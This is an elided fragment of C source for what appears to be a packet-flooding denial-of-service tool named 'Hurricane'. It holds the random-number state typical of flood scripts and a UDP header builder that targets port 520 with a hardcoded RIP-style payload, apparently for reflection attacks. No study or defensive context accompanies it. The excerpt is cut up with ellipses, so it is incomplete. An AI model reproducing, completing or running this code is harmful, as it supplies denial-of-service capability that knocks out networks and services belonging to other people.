...
#include <string.h>
#include <errno.h>
#define MAX_PACKET_SIZE 7225
#define PHI 0x9e3779b9

static unsigned long int Q[7225], c = 362436;
struct list
{
...
volatile unsigned int sleeptime = 160;
...
static unsigned long int i = 7224
...
void setup_udp_header(struct udphdr *udph)
{
	...
	udph->dest = htons(520);
        udph->check = 0;
        memcpy((void *)udph + sizeof(struct udphdr), "\x07\x22\x05\x00\x80\x04\x00\x44\x00\x80\x08\x08\x08\x08\x08\x08\x08\x18\x72\x55\x50\x00\x04\x20", 24);
...
srand(time(0));
fprintf(stdout, "Hurricane: Creating Packets\n");
